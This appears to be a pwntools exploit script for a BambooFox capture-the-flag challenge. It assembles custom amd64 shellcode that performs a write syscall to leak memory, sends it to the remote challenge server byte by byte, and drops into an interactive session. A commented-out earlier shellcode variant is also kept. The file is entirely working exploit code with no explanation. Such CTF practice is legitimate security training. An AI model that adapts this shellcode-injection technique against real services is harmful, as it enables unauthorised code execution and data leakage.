from pwn import *
context.arch = "amd64"
r = remote("chall.ctf.bamboofox.tw", 10105)
'''
off = 13
sc = asm("jmp leak\n"+"nop\n"*(off)+"""
leak:
mov rbx,0x4141414141414141
push rbx
mov al,1
push rsp
pop rsi
syscall
""").ljust(32,b'+').replace(b"A",b"+")
'''
off = 1
sc = asm("jmp leak\n"+"nop\n"*(off)+"""
print:
xor rdi, rdi
push rbx
mov al,1
push rsp
pop rsi
syscall
leak:
lea rdi, [rip+print]
push rdi
mov rbx,0x4141414141414141
ret
""").ljust(32,b'+').replace(b"A",b"+")

print(sc)
print(disasm(sc))
for c in sc:
    if c == ord('+'):
        print("p")
        r.sendline(bytes([c]))
    else:
        r.sendline(str(c))
r.interactive()
